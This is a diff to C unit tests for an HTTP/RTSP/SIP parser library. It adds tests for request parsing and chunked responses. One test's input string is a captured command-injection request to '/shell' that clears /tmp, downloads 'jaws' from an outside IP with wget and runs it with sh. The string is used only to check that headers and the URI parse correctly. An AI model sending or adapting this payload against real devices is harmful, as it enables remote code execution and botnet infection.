@@ -28,6 +28,66 @@ static void http_request_test(void)
 	http_parser_destroy(parser);
 }
 
+static void http_request_test2(void)
+{
+	static const char* s = "GET /shell?cd+/tmp;rm+-rf+*;wget+ 65.21.184.203/jaws;sh+/tmp/jaws HTTP/1.1\r\nUser-Agent: Hello, world\r\nHost: 127.0.0.1:80\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q\r\n";
+
+	size_t n;
+	int major, minor;
+	char protocol[64];
+	http_parser_t* parser;
+
+	n = strlen(s);
+	parser = http_parser_create(HTTP_PARSER_REQUEST, NULL, NULL);
+	assert(1 /*INPUT_HEADER*/ == http_parser_input(parser, s, &n));
+	assert(0 == http_get_version(parser, protocol, &major, &minor) && 1 == major && 1 == minor && 0 == strcmp("HTTP", protocol));
+	assert(0 == strcmp(http_get_request_uri(parser), "/shell?cd+/tmp;rm+-rf+*;wget+ 65.21.184.203/jaws;sh+/tmp/jaws"));
+	assert(0 == strcmp(http_get_request_method(parser), "GET"));
+	assert(0 == strcmp(http_get_header_by_name(parser, "Host"), "127.0.0.1:80"));
+	assert(0 == strcmp(http_get_header_by_name(parser, "User-Agent"), "Hello, world"));
+	assert(0 == strcmp(http_get_header_by_name(parser, "Accept"), "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q"));
+	http_parser_destroy(parser);
+}
+
+static void http_chunk_test(void)
+{
+	static const char s[] = { 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x20, 0x32, 0x30, 0x30, 0x20, 0x4f
+	, 0x4b, 0x0d, 0x0a, 0x53, 0x65, 0x72, 0x76, 0x65, 0x72, 0x3a, 0x20, 0x4d, 0x69, 0x63
+	, 0x72, 0x6f, 0x73, 0x6f, 0x66, 0x74, 0x2d, 0x49, 0x49, 0x53, 0x2f, 0x35, 0x2e, 0x31
+	, 0x2e, 0x31, 0x37, 0x2e, 0x37, 0x0d, 0x0a, 0x44, 0x61, 0x74, 0x65, 0x3a, 0x20, 0x4d
+	, 0x6f, 0x6e, 0x2c, 0x20, 0x30, 0x33, 0x20, 0x46, 0x65, 0x62, 0x20, 0x32, 0x30, 0x32
+	, 0x30, 0x20, 0x30, 0x33, 0x3a, 0x33, 0x36, 0x3a, 0x34, 0x30, 0x20, 0x47, 0x4d, 0x54
+	, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x2d, 0x54, 0x79, 0x70, 0x65
+	, 0x3a, 0x20, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f
+	, 0x6f, 0x63, 0x74, 0x65, 0x74, 0x2d, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6d, 0x0d, 0x0a
+	, 0x54, 0x72, 0x61, 0x6e, 0x73, 0x66, 0x65, 0x72, 0x2d, 0x45, 0x6e, 0x63, 0x6f, 0x64
+	, 0x69, 0x6e, 0x67, 0x3a, 0x20, 0x63, 0x68, 0x75, 0x6e, 0x6b, 0x65, 0x64, 0x0d, 0x0a
+	, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x20, 0x63, 0x6c
+	, 0x6f, 0x73, 0x65, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x2d, 0x54
+	, 0x79, 0x70, 0x65, 0x3a, 0x20, 0x74, 0x65, 0x78, 0x74, 0x2f, 0x70, 0x6c, 0x61, 0x69
+	, 0x6e, 0x0d, 0x0a, 0x0d, 0x0a, 0x33, 0x30, 0x0d, 0x0a, 0x64, 0x38, 0x3a, 0x69, 0x6e
+	, 0x74, 0x65, 0x72, 0x76, 0x61, 0x6c, 0x69, 0x33, 0x36, 0x30, 0x30, 0x65, 0x31, 0x32
+	, 0x3a, 0x6d, 0x69, 0x6e, 0x20, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x76, 0x61, 0x6c, 0x69
+	, 0x31, 0x38, 0x30, 0x30, 0x65, 0x35, 0x3a, 0x70, 0x65, 0x65, 0x72, 0x73, 0x30, 0x3a
+	, 0x65, 0x0d, 0x0a, 0x30, 0x0d, 0x0a, 0x0d, 0x0a };
+
+	size_t n;
+	int major, minor;
+	char protocol[64];
+	http_parser_t* parser;
+
+	n = sizeof(s);
+	parser = http_parser_create(HTTP_PARSER_RESPONSE, NULL, NULL);
+	assert(0 == http_parser_input(parser, s, &n));
+	assert(0 == http_get_version(parser, protocol, &major, &minor) && 1 == major && 1 == minor && 0 == strcmp("HTTP", protocol));
+	assert(200 == http_get_status_code(parser));
+	assert(0 == strcmp(http_get_header_by_name(parser, "Transfer-Encoding"), "chunked"));
+	assert(0 == strcmp(http_get_header_by_name(parser, "Connection"), "close"));
+	assert(0 == strcmp(http_get_header_by_name(parser, "Server"), "Microsoft-IIS/5.1.17.7"));
+	assert(0 == strcmp(http_get_header_by_name(parser, "Date"), "Mon, 03 Feb 2020 03:36:40 GMT"));
+	http_parser_destroy(parser);
+}
+
 static void rtsp_response_test(void)
 {
 	static const char* s = "RTSP/1.0 200 OK\r\n" \
@@ -126,7 +186,7 @@ static void sip_response_test(void)
 
 static void sip_payload(void* param, const void* data, int bytes)
 {
-	printf("%.*s", bytes, (const char*)data);
+	//printf("%.*s", bytes, (const char*)data);
 }
 
 static void sip_request_test2(void)
@@ -174,10 +234,50 @@ void http_parser_test(void)
 {
 	int i;
 	http_request_test();
+	http_request_test2();
+	http_chunk_test();
 	rtsp_response_test();
 	sip_response_test();
 
 	srand((unsigned int)time64_now());
 	for (i = 0; i < 10000; i++)
 		sip_request_test2();
+}
+
+static void http_parser_test_ondata(void* param, const void* data, int len)
+{
+	fwrite(data, 1, len, (FILE*)param);
+}
+
+void http_parser_test2(const char* responseFile)
+{
+	int r;
+	size_t n;
+	int major, minor;
+	char protocol[64];
+	char buffer[2 * 1024];
+	http_parser_t* parser;
+
+	FILE* rfp = fopen(responseFile, "rb");
+	FILE* wfp = fopen("1.raw", "wb");
+
+	parser = http_parser_create(HTTP_PARSER_RESPONSE, http_parser_test_ondata, wfp);
+	n = fread(buffer, 1, sizeof(buffer), rfp);
+	while (n > 0)
+	{
+		r = http_parser_input(parser, buffer, &n);
+		assert(r >= 0 && 0 == n);
+		if (r == 0 || r == 2)
+		{
+			assert(0 == http_get_version(parser, protocol, &major, &minor) && 1 == major && 1 == minor && 0 == strcmp("HTTP", protocol));
+			assert(200 == http_get_status_code(parser));
+			assert(0 == strcmp(http_get_header_by_name(parser, "Transfer-Encoding"), "chunked"));
+			assert(0 == strcmp(http_get_header_by_name(parser, "Connection"), "close"));
+		}
+		n = fread(buffer, 1, sizeof(buffer), rfp);
+	}
+	http_parser_destroy(parser);
+
+	fclose(rfp);
+	fclose(wfp);
 }
